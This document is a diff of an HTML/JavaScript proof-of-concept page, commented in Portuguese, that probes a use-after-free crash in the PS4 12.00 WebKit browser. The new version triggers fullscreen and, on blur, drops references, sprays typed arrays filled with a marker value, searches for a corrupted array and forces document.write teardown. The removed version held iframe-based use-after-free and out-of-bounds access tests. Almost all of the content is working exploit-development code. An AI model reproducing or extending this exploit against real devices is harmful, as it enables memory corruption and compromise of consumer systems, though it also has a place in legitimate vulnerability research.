@@ -1,114 +1,80 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="UTF-8">
-<title>PS4 WebKit Lifecycle Tests</title>
+    <meta charset="UTF-8">
+    <title>PS4 FullScreen+Blur Crash - Test arr=null</title>
 </head>
-<body style="font-family:sans-serif;">
+<body>
 
-<h2>PS4 12.00 - Lifecycle / UAF Investigation</h2>
+<h1>PS4 12.00 - Crash Isolation (arr=null test)</h1>
 
-<button onclick="runNoIframe()">Teste 1 - Sem Iframe (GC + Crash)</button>
-<button onclick="runWithIframe()">Teste 2/3 - Com Iframe (Persistência)</button>
-
-<pre id="log" style="background:#111;color:#0f0;padding:10px;height:300px;overflow:auto;"></pre>
+<button onclick="runCrashTest1()">Run Crash</button>
+<div id="result1"></div>   
 
 <script>
-function log(msg) {
-    document.getElementById("log").innerText += msg + "\n";
-}
+const PATTERN = 2.121995791e-314;
 
-/* =========================
-   TESTE 1 - SEM IFRAME
-   ========================= */
-function runNoIframe() {
-    log("[Teste 1] Iniciando (sem iframe)...");
+function runCrashTest1() {
+    const result = document.getElementById('result1');
+    result.innerHTML = '<h4>Crash PoC Running - Press OPTIONS button</h4>';
+    
+    let controllers = [];
 
-    let arr = new Float64Array(8);
-    arr[0] = 13.37;
-
-    document.documentElement.webkitRequestFullscreen?.();
-
+    // Passo 1 (inalterado)
+    for(let i = 0; i < 5000; i++) {
+        let arr = new Float64Array(8);
+        arr[0] = i;
+        controllers.push(arr);
+    }
+    
+    // Passo 2 (inalterado)
+    const elem = document.documentElement;
+    if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
+    
+    // Passo 3 (inalterado)
     window.onblur = function() {
-        log("[Teste 1] onblur disparado");
+        result.innerHTML += '<p>onblur triggered</p>';
+        
+        // 🔴 TESTE: remover referências aos TypedArrays
+        result.innerHTML += '<p>Nullificando referências...</p>';
+        controllers = null;
 
-        // GC AGRESSIVO
-        log("[Teste 1] Forçando GC...");
-        for (let i = 0; i < 10000; i++) {
-            new ArrayBuffer(0x10000);
+        // (opcional leve GC pressure sem alterar muito timing)
+        for (let i = 0; i < 1000; i++) {
+            new ArrayBuffer(0x1000);
         }
 
-        // Trigger crash
-        log("[Teste 1] Executando document.write...");
-        document.open();
-        document.write("<h1>Crash Test</h1>");
-        document.close();
+        // Passo 4 (spray mantido)
+        let spray = [];
+        for(let i = 0; i < 8000; i++) {
+            let p = new Float64Array(10);
+            p.fill(PATTERN);
+            spray.push(p);
+        }
+        
+        // Passo 5 (mantido, mas pode não encontrar nada agora)
+        let corrupted = null;
+        if (controllers) {
+            for(let i = 0; i < controllers.length; i++) {
+                if (controllers[i][0] === PATTERN) {
+                    corrupted = controllers[i];
+                    break;
+                }
+            }
+        }
+
+        result.innerHTML += '<p>Seguindo para document.write...</p>';
+
+        // Passo 6 (INALTERADO - CRÍTICO)
+        setTimeout(() => {
+            document.open();
+            document.write('<html><body><h1>Crash</h1></body></html>');
+            document.close();
+            setTimeout(() => location.reload(), 500);
+        }, 3000);
     };
 }
 
-/* =========================
-   TESTE 2/3 - COM IFRAME
-   ========================= */
-function runWithIframe() {
-    log("[Teste 2/3] Iniciando com iframe...");
-
-    const iframe = document.createElement("iframe");
-    iframe.style.width = "400px";
-    iframe.style.height = "200px";
-    document.body.appendChild(iframe);
-
-    const fDoc = iframe.contentDocument;
-
-    fDoc.open();
-    fDoc.write(`
-        <html>
-        <body>
-        <button onclick="start()">Start Fullscreen</button>
-        <script>
-            let ref = new Float64Array(8);
-            ref[0] = 42.42;
-
-            window.start = function() {
-                document.documentElement.webkitRequestFullscreen?.();
-
-                window.onblur = function() {
-                    console.log("[Iframe] onblur");
-
-                    // GC AGRESSIVO
-                    for (let i = 0; i < 10000; i++) {
-                        new ArrayBuffer(0x10000);
-                    }
-
-                    // TEARDOWN
-                    document.open();
-                    document.write("<h1>Teardown</h1>");
-                    document.close();
-
-                    // TESTE 2 - ACESSO PÓS-TEARDOWN
-                    setTimeout(() => {
-                        try {
-                            console.log("[Teste 2] ref[0]:", ref[0]);
-                        } catch(e) {
-                            console.log("[Teste 2] Erro:", e);
-                        }
-                    }, 0);
-
-                    // TESTE 3 - OOB
-                    setTimeout(() => {
-                        try {
-                            console.log("[Teste 3] ref[1000]:", ref[1000]);
-                        } catch(e) {
-                            console.log("[Teste 3] Erro OOB:", e);
-                        }
-                    }, 0);
-                };
-            };
-        <\/script>
-        </body>
-        </html>
-    `);
-    fDoc.close();
-}
 </script>
 
 </body>
